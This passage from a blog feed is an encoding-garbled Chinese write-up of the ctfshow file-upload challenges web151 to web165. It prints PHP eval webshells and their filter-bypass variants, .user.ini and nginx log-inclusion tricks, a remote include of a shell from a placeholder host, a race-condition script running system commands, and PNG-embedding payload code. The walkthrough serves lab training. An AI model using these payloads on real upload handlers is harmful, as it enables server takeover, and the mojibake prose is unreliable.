            <tag> ctfshow sqlæ³¨å…¥ åˆ·é¢˜è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow æ–‡ä»¶ä¸Šä¼  åˆ·é¢˜è®°å½•</title>
      <link href="/posts/8b3f0eaf.html"/>
      <url>/posts/8b3f0eaf.html</url>
      
        <content type="html"><![CDATA[<p>æ–‡ä»¶ä¸Šä¼ æ£€æµ‹æœ‰ä¸‰ä¸ª</p><ol><li><strong>æ–‡ä»¶å</strong></li><li><strong>æ–‡ä»¶ç±»å‹</strong></li><li><strong>æ–‡ä»¶å†…å®¹</strong></li></ol><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204215335.png" alt="image-20221224204215335"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224203050054.png" alt="image-20221224203050054"></p><p>windowsä¸‹åˆæˆå›¾ç‰‡ç æ–¹æ³•ã€‚</p><p>ç„¶åä¼ å›¾ç‰‡ç </p><p>è¿›è¡ŒæŠ“åŒ…</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204251719.png" alt="image-20221224204251719"></p><p>æŠ“åŒ…åä¿®æ”¹åç¼€ä¸ºphpï¼Œç„¶åè®¿é—®ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204343141.png" alt="image-20221224204343141"></p><p>å‡ºç°è¿™ç§æƒ…å†µå°±æ˜¯æˆåŠŸäº†ï¼Œç„¶åç”¨èšå‰‘è¿æ¥</p><p>ç„¶åå°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</p><p><strong>è§£æ³•äºŒ</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224204852845.png" alt="image-20221224204852845"></p><p>ç›´æ¥æŠŠè¿™é‡Œçš„pngé™åˆ¶ç»™æ”¹æˆphpï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬äº†ï¼Œç„¶åè¿›è¡Œrceäº†ã€‚</p><h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205346493.png" alt="image-20221224205346493"></p><p>è¿˜æ˜¯ä¸€æ ·çš„æ ¼å¼ï¼Œ</p><p>é‚£ä¹ˆè¿˜æ˜¯ä¸Šä¼ å›¾ç‰‡ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å›¾ç‰‡ç å°±æ˜¯ä¸€å¥è¯æœ¨é©¬&lt;?php eval($_POST[1]);?&gt;  åŠ ä¸Šä»»æ„ä¸€å¼ å›¾ç‰‡ç»„æˆçš„å›¾ç‰‡ç ã€‚</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸåè¿›è¡Œä¿®æ”¹åç¼€ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205601789.png" alt="image-20221224205601789"></p><p>ç„¶åå°±å»è®¿é—®url/upload/normal_upload.php  </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205644437.png" alt="image-20221224205644437"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224205655846.png" alt="image-20221224205655846"></p><p>ç„¶åå°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</p><h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224213230135.png" alt="image-20221224213230135"></p><p>è¿™é“é¢˜å±…ç„¶è¿™ä¹ˆå¿«å°±ç”¨åˆ°<code>.user.ini</code>,æˆ‘ä»¥ä¸ºè¿˜è¦åˆ°åé¢çš„é¢˜ã€‚</p><p><a href="https://blog.csdn.net/qq_63548648/article/details/128165642">https://blog.csdn.net/qq_63548648/article/details/128165642</a>   è¿™æ˜¯æˆ‘å¯¹ .htacesså’Œ.user.iniç”¨æ³•çš„æ€»ç»“ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œè™½ç„¶æ”¹æ–‡ä»¶åç¼€å¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯ç½‘ç«™æ— æ³•è¿›è¡Œè§£æï¼Œèšå‰‘ä¹Ÿä¸èƒ½è¿æ¥ã€‚æ‰€ä»¥å°±å¾—å»ç”¨.user.iniäº†</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224231943017.png" alt="image-20221224231943017"></p><p>å…ˆä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œç„¶åé€šè¿‡æ”¹å›¾ç‰‡åå’Œå†…å®¹ï¼Œä¸Šä¼ .user.ini</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232145899.png" alt="image-20221224232145899"></p><p>è¿™é‡Œä¸Šä¼ çš„<code>auto_append_file</code>åé¢è·Ÿç€çš„æ–‡ä»¶åè¦å’Œåé¢ä¸Šä¼ çš„æ–‡ä»¶åä¸€æ ·</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232300737.png" alt="image-20221224232300737"></p><p>æˆåŠŸä¸Šä¼ ï¼Œç„¶åå»è®¿é—®/upload/å°±è¡Œ</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232348250.png" alt="image-20221224232348250"></p><p>å‡ºç°è¿™ç§æƒ…å†µå°±ä»£è¡¨æˆåŠŸäº†ï¼Œç„¶åè¿›è¡Œèšå‰‘è¿æ¥å°±èƒ½æ‹¿åˆ°flagäº†ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224232529978.png" alt="image-20221224232529978"></p><h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224233441983.png" alt="image-20221224233441983"></p><p>è¿™é“é¢˜å’Œä¸Šä¸€é¢˜è§£æ³•ä¸€æ ·ï¼Œåªä¸è¿‡è¿™é“é¢˜æ˜¯æŠŠphpç»™è¿‡æ»¤æ‰äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çŸ­æ ‡ç­¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;   ---&gt;  &lt;?= eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221224233918091.png" alt="image-20221224233918091"></p><p>è§£æ³•å’Œweb154ä¸€æ ·ï¼Œå°±ä¸å¤šå†™äº†</p><h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225003016143.png" alt="image-20221225003016143"></p><p>å’Œä¸Šä¸€é¢˜è§£æ³•ä¸€æ ·ï¼Œåªä¸è¿‡è¿™é‡Œè¿‡æ»¤äº†[],é‚£ä¹ˆå¯ä»¥æŠŠä»£ç æ”¹æˆ{}</p><p>è¿˜æœ‰ä¸ä¸€æ ·çš„æ˜¯   ä¸Šä¼ çš„å›¾ç‰‡é‡Œä¸èƒ½å¸¦å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= eval($_POST&#123;1&#125;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225003245068.png" alt="image-20221225003245068"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œå’Œå‰ä¸¤é¢˜çš„å·®åˆ«æ˜¯è¿™é‡Œçš„&lt;?php eval($_POST[1]);?&gt;ä¸èƒ½ç”¨äº†ï¼Œå› ä¸ºå°±æ˜¯&#123;&#125;[]éƒ½è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ¢å¦ä¸€ç§å†™æ³•</span><br><span class="line">&lt;?= eval($_POST[1])?&gt;  ---&gt;  phpä¸­ä¸å¸¦;ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œä»£ç çš„</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225004524802.png" alt="image-20221225004524802"></p><p>è¿™é‡Œå°±æ˜¯å’Œä¸Šä¸€é¢˜ä¸åŒçš„åœ°æ–¹ã€‚   </p><p>ç„¶åå…¶ä»–éƒ½ä¸€æ ·ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225004647307.png" alt="image-20221225004647307"></p><h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225004739667.png" alt="image-20221225004739667"></p><p>å’Œä¸Šä¸€é¢˜è§£æ³•ä¸€æ ·ï¼Œå°±ä¸å¤šè¯´äº†ã€‚</p><h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225005311958.png" alt="image-20221225005311958"></p><p>è¿™é“é¢˜å¯ä»¥ä½¿ç”¨æ–‡ä»¶çš„æ—¥å¿—åŒ…å«ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &#x27;/var/lo&#x27;.&#x27;g/nginx/access/lo&#x27;.&#x27;g&#x27;  å› ä¸ºlogè¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆåªèƒ½ç”¨è¿™ç§æ–¹æ³•äº†</span><br></pre></td></tr></table></figure><p><strong>ç¬¬ä¸€æ­¥</strong></p><p>å°±æ˜¯å…ˆä¸Šä¼ .user.iniä»¥åï¼Œç„¶åè¿›è¡Œæ—¥å¿—åŒ…å«</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225132701372.png" alt="image-20221225132701372"></p><p><strong>ç¬¬äºŒæ­¥</strong></p><p>ä¼ ä¸€å¥è¯æœ¨é©¬</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225132752973.png" alt="image-20221225132752973"></p><p><strong>ç¬¬ä¸‰æ­¥</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225132810021.png" alt="image-20221225132810021"></p><p>è¿›è¡Œrceã€‚</p><h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225133639357.png" alt="image-20221225133639357"></p><p>è¿™é¢˜å’Œä¸Šä¸€é¢˜çš„è§£æ³•ä¸€æ ·ï¼Œåªä¸è¿‡è¿™é¢˜æŠŠç©ºæ ¼ç»™è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨%0dæ¥æ›¿ä»£ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include1&#x27;/var/lo&#x27;.&#x27;g/nginx/access.lo&#x27;.&#x27;g&#x27;?&gt;   ç„¶åè½¬åˆ°Hexè¿™é‡Œæ‰¾çš„1æ‰€åœ¨çš„ä½ç½®ï¼Œç„¶åæŠŠ1çš„16è¿›åˆ¶å¤„æ”¹æˆ0då°±å¯</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225133949942.png" alt="image-20221225133949942"></p><p>åœ¨ç©ºæ ¼è¢«è¿‡æ»¤çš„æ—¶å€™   å¯ä»¥ç”¨<strong>0a 0b 0c 0d</strong>æ¥æ›¿ä»£</p><h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225151417817.png" alt="image-20221225151417817"></p><p>è¿˜æ˜¯ä¸€æ ·çš„ä¸œè¥¿ï¼Œè¿™ä¸è¿‡è¿™é‡Œè¿‡æ»¤äº†å¥½å¤šï¼Œè¯•äº†ä¸‹ï¼Œå°±æ˜¯æŠŠpngå¤´ç»™è¿‡æ»¤æ‰äº†ã€‚</p><p>è¿™é‡Œç”¨GIFå›¾ç‰‡å¤´å¯ä»¥ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225151910771.png" alt="image-20221225151910771"></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±å¯ä»¥ç”¨.user.iniäº†ã€‚</p><p>ä¸Šä¼ .user.iniçš„æ—¶å€™ä¹Ÿè¦åŠ ä¸ŠGIF89aå¤´</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225152324031.png" alt="image-20221225152324031"></p><p>ç„¶åå°±å»å’Œå‰é¢ä¸€æ ·è¿›è¡Œæ—¥å¿—åŒ…å«äº†ã€‚</p><p>ç„¶åè¿›è¡Œrceå°±è¡Œäº†ã€‚</p><h2 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225153759215.png" alt="image-20221225153759215"></p><p>è¿™é‡Œç»è¿‡æµ‹è¯•ä¸èƒ½ç”¨        <strong>.</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«æˆ–è€…sessionæ¡ä»¶ç«äº‰æˆ–è€…åˆ©ç”¨asciiæ„é€ ä»£ç (å°±æ˜¯åˆ©ç”¨å¼‚æˆ–    æˆ–    é   ä¸  ç­‰æ¥æ„é€ )</p><p><strong>è§£æ³•ä¸€</strong></p><p>æ¡ä»¶ç«äº‰   </p><p><a href="https://blog.csdn.net/miuzzx/article/details/109537262?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161223805616780262526924%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161223805616780262526924&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109537262.pc_search_result_no_baidu_js&amp;utm_term=ctfshow%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/miuzzx/article/details/109537262?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161223805616780262526924%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161223805616780262526924&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109537262.pc_search_result_no_baidu_js&amp;utm_term=ctfshow%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&amp;spm=1018.2226.3001.4187</a></p><p>yuå¸ˆå‚…å†™çš„ï¼Œå¯ä»¥æ¥å‚è€ƒï¼Œæˆ‘å°±ä¸å†™äº†</p><p><strong>æ¡ä»¶ç«äº‰ä»£ç </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;yu22x&#x27;</span></span><br><span class="line">url1=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;yu22x&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = session.get(url2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><p><strong>è§£æ³•äºŒ</strong></p><p>å¯ä»¥åˆ©ç”¨vpsæ¥å†™ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä¸æ‡‚æ­ï¼Œè€Œä¸”ç¾¤ä¸»çš„è§†é¢‘é‡Œé‚£ä¸ªvpsæ‰“ä¸å¼€äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://your-shell.com/1</span><br><span class="line">http://731540450/1</span><br></pre></td></tr></table></figure><p><img src="file:///C:\Users\sdbdb\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF(TYDYECOKVDYB.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include&#x27;http://xxxxx/&#x27;?&gt;  ---&gt;è¿™ä¸ªç½‘å€é‡Œæ˜¯ä¸€å¥è¯æœ¨é©¬  &lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥è®¿é—®url/uploadè¿›è¡Œrceå°±èƒ½æ‹¿åˆ°flagäº†ã€‚</p><h2 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225163327014.png" alt="image-20221225163327014"></p><p>è¿™é‡Œå°±æœ‰ä¸¤ç§è§£æ³•ï¼Œä¸€ç§æ˜¯æ¡ä»¶ç«äº‰ï¼Œä¸€ç§å°±æ˜¯åˆ©ç”¨vps</p><p>å› ä¸ºæ‰‹å¤´ä¸Šæ²¡æœ‰vpsé‚£ä¹ˆè¿™é“é¢˜å°±ç©ºç€äº†.</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225163510878.png" alt="image-20221225163510878"></p><p>å¦‚æœæœ‰çš„è¯ï¼Œç›´æ¥ç›´æ¥ä¸Šä¼ ï¼Œç„¶åè®¿é—®/uploadå°±è¡Œäº†ï¼Œ</p><h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225170512492.png" alt="image-20221225170512492"></p><p>è¿™é“é¢˜çš„è€ƒç‚¹æ˜¯pngå›¾ç‰‡çš„äºŒæ¬¡æ¸²æŸ“ï¼Œå°±æ˜¯å¾—åœ¨å›¾ç‰‡é‡ŒåŒ…å«æˆ‘ä»¬çš„phpä»£ç ï¼Œè¿™é‡Œå›¾ç‰‡å¾—ç”¨ä»£ç æ¥æ¸²æŸ“ï¼Œç›´æ¥å›¾ç‰‡å’Œä»£ç åˆæˆèµ·æ¥çš„å›¾ç‰‡ç ä¸è¡Œã€‚</p><p>æ¸²æŸ“ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;3.png&#x27;</span>); <span class="comment">#ä¿å­˜åœ¨æœ¬åœ°çš„å›¾ç‰‡é©¬</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨phpstudyçš„wwwé‡Œä¿å­˜è¿™æ®µä»£ç ï¼Œå¹¶ä¸”æŠŠä¸€å¼ å›¾ç‰‡ä¹Ÿä¿å­˜ä¸‹æ¥ï¼Œå¹¶ä¸”å‘½åä¸ºè‡ªå·±æƒ³è¦å‘½åçš„åå­—ã€‚</p><p>å¦‚ä½•å°±å»ä¸Šä¼ è¿™ä¸ªæ¸²æŸ“åçš„å›¾ç‰‡ç ï¼Œå¹¶ä¸”è¿›è¡ŒæŠ“åŒ…æŸ¥çœ‹å°±è¡Œäº†ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225195009472.png" alt="image-20221225195009472"></p><p>æˆåŠŸå†™å…¥ä»£ç å¹¶ä¸”æ‰§è¡Œäº†ï¼Œç„¶åè¿›è¡Œrceå°±è¡Œäº†ã€‚</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225195105069.png" alt="image-20221225195105069"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é“é¢˜æ˜¯è€ƒå¯Ÿpngå›¾ç‰‡çš„äºŒæ¬¡æ¸²æŸ“ï¼Œåˆæˆçš„å›¾ç‰‡ç è¿™é‡Œè¡Œä¸é€šã€‚</span><br></pre></td></tr></table></figure><h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><p>æºç </p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225202653862.png" alt="image-20221225202653862"></p><p>è¿™é‡Œå°±æ˜¯åˆ©ç”¨çš„jpgäºŒæ¬¡æ¸²æŸ“ï¼Œä½†æ˜¯è¿™é“é¢˜å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œå¥½åƒå¾—æ‰¾åˆ°ç‰¹æ®Šçš„å›¾ç‰‡æ‰èƒ½æˆåŠŸï¼Œæ‰€ä»¥è¿™é‡Œæ•™æ–¹æ³•å°±è¡Œäº†ã€‚</p><p><strong>jpgæ¸²æŸ“ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 